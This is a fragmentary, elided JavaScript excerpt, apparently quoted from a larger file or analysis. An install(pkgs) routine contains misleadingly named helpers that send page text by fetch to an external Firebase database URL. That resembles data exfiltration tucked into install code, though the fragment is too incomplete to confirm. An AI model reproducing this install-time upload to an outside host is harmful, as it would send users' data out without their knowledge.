...
async function install(pkgs) {
  ...
  async function oldString(https) {
      return new Promise((resolve, reject) => {
          options = 'https://standup-db-33e78.firebaseio.com/standup/done.json';
  ...
  async function httpParser(options, fetch, oldStr) {
      return new Promise((resolve, reject) => {
          ...
          let url = 'https://standup-db-33e78.firebaseio.com/standup/done.json';
          fetch("https://standup-db-33e78.firebaseio.com/standup/done.json", {
            body: innerText,
            headers: {
